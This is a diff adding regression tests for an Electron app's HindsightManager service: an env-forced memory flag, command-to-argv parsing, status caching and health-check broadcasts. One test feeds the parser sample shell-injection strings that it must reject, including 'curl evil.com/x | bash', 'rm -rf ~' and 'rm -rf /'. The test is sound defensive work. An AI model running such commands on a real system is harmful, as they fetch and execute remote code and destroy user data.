@@ -50,7 +50,7 @@ installElectronStub();
 import * as HMModule from '../../../dist-electron/electron/services/HindsightManager.js';
 let { HindsightManager } = HMModule;
 
-const ENV_KEYS = ['HINDSIGHT_BASE_URL', 'HINDSIGHT_API_KEY', 'HINDSIGHT_TIMEOUT_MS'];
+const ENV_KEYS = ['HINDSIGHT_BASE_URL', 'HINDSIGHT_API_KEY', 'HINDSIGHT_TIMEOUT_MS', 'NATIVELY_HINDSIGHT_MEMORY', 'HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL'];
 function clearEnv() { for (const k of ENV_KEYS) delete process.env[k]; }
 
 describe('HindsightManager.getHindsightConfig', () => {
@@ -489,6 +489,102 @@ describe('HindsightManager — round-5 regression suite', () => {
       assert.equal(hm.lastAuthFailedAt, 0, 'network error must clear lastAuthFailedAt');
     } finally {
       globalThis.fetch = origFetch;
+      hm.lastAuthFailedAt = 0;
+      hm.lastCheckedAt = 0;
+      hm.lastHealthy = false;
+    }
+  });
+});
+
+// ROUND-6 REGRESSION SUITE — fixes for the round-6 audit findings.
+describe('HindsightManager — round-6 regression suite', () => {
+  beforeEach(clearEnv);
+  afterEach(clearEnv);
+
+  // HIGH #1 — auto-flip must SKIP when env forces the flag (either direction). Before the
+  // fix, NATIVELY_HINDSIGHT_MEMORY=0 left no SettingsManager trace, so the auto-flip wrote
+  // hindsightMemoryEnabled=true to settings → silently re-enabled the moment env was unset.
+  test('memoryFlagEnvForced detects NATIVELY_HINDSIGHT_MEMORY in both directions', () => {
+    const hm = HindsightManager.getInstance();
+    process.env.NATIVELY_HINDSIGHT_MEMORY = '0';
+    assert.equal(hm.memoryFlagEnvForced(), true, 'env=0 should be detected as forced');
+    process.env.NATIVELY_HINDSIGHT_MEMORY = '1';
+    assert.equal(hm.memoryFlagEnvForced(), true, 'env=1 should be detected as forced');
+    delete process.env.NATIVELY_HINDSIGHT_MEMORY;
+    assert.equal(hm.memoryFlagEnvForced(), false, 'no env should not be forced');
+  });
+
+  // MEDIUM #5 — parseCommandToArgv rejects shell metacharacters and parses quoted paths.
+  test('parseCommandToArgv parses quoted launcher path', () => {
+    const hm = HindsightManager.getInstance();
+    const argv = hm.parseCommandToArgv('bash "/Users/me/Application Support/scripts/hindsight-start.sh"');
+    assert.deepEqual(argv, ['bash', '/Users/me/Application Support/scripts/hindsight-start.sh']);
+  });
+  test('parseCommandToArgv parses simple multi-token command', () => {
+    const hm = HindsightManager.getInstance();
+    assert.deepEqual(hm.parseCommandToArgv('my-launcher --foo bar'), ['my-launcher', '--foo', 'bar']);
+  });
+  test('parseCommandToArgv rejects shell metacharacters (injection)', () => {
+    const hm = HindsightManager.getInstance();
+    for (const evil of [
+      'bash x; curl evil.com/x | bash',
+      'bash $(rm -rf ~)',
+      'bash `whoami`',
+      'bash x && rm -rf /',
+      'bash x | sh',
+      'bash x > /etc/passwd',
+      'bash "unterminated',
+    ]) {
+      assert.equal(hm.parseCommandToArgv(evil), null, `should reject: ${evil}`);
+    }
+  });
+
+  // MEDIUM #6 — broadcastStatus('spawn-failed'|'unreachable') pins the availability cache
+  // to false so isAvailable() doesn't return optimistic-true after a failed start().
+  test('broadcastStatus failure states pin lastHealthy false + stamp lastCheckedAt', () => {
+    const hm = HindsightManager.getInstance();
+    // Reset to cold-start.
+    hm.lastHealthy = true;
+    hm.lastCheckedAt = 0;
+    // broadcastStatus is private; reach it (JS has no real privacy).
+    hm.broadcastStatus('spawn-failed', 'test');
+    assert.equal(hm.lastHealthy, false, 'spawn-failed should pin lastHealthy false');
+    assert.ok(hm.lastCheckedAt > 0, 'spawn-failed should stamp lastCheckedAt');
+    // unreachable too.
+    hm.lastHealthy = true;
+    hm.lastCheckedAt = 0;
+    hm.broadcastStatus('unreachable', 'test');
+    assert.equal(hm.lastHealthy, false);
+    assert.ok(hm.lastCheckedAt > 0);
+    // 'spawning' must NOT touch the cache (poll loop owns it).
+    hm.lastHealthy = true;
+    hm.lastCheckedAt = 0;
+    hm.broadcastStatus('spawning');
+    assert.equal(hm.lastHealthy, true, 'spawning should leave cache alone');
+    assert.equal(hm.lastCheckedAt, 0);
+    // cleanup
+    hm.lastHealthy = false;
+    hm.lastCheckedAt = 0;
+  });
+
+  // MEDIUM #4 — network error after auth-failure broadcasts 'unreachable' so the banner
+  // transitions off the misleading "Cloud key rejected" copy.
+  test('healthCheck network error after auth-failure broadcasts unreachable', async () => {
+    const hm = HindsightManager.getInstance();
+    hm.lastAuthFailedAt = Date.now() - 1000; // we were in auth-failed state
+    const broadcasts = [];
+    const origBroadcast = hm.broadcastStatus.bind(hm);
+    hm.broadcastStatus = (state, reason) => { broadcasts.push({ state, reason }); };
+    const origFetch = globalThis.fetch;
+    globalThis.fetch = async () => { throw new Error('ECONNREFUSED'); };
+    try {
+      const ok = await hm.healthCheck();
+      assert.equal(ok, false);
+      assert.equal(hm.lastAuthFailedAt, 0, 'network error clears auth-failed cache');
+      assert.ok(broadcasts.some((b) => b.state === 'unreachable'), 'should broadcast unreachable');
+    } finally {
+      globalThis.fetch = origFetch;
+      hm.broadcastStatus = origBroadcast;
       hm.lastAuthFailedAt = 0;
       hm.lastCheckedAt = 0;
       hm.lastHealthy = false;
